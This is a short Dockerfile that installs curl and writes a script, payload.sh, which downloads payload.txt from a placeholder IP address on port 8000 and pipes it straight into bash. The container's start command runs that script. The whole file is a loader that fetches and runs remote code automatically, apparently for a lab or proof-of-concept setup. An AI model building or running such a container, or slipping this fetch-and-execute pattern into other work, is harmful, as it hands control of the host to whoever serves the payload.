FROM debian

RUN apt update && apt install curl -y
RUN echo "curl -s http://<ip_address>:8000/payload.txt | bash" > payload.sh
RUN chmod +x ./payload.sh

ENTRYPOINT ["/bin/bash"]
CMD ["./payload.sh"]
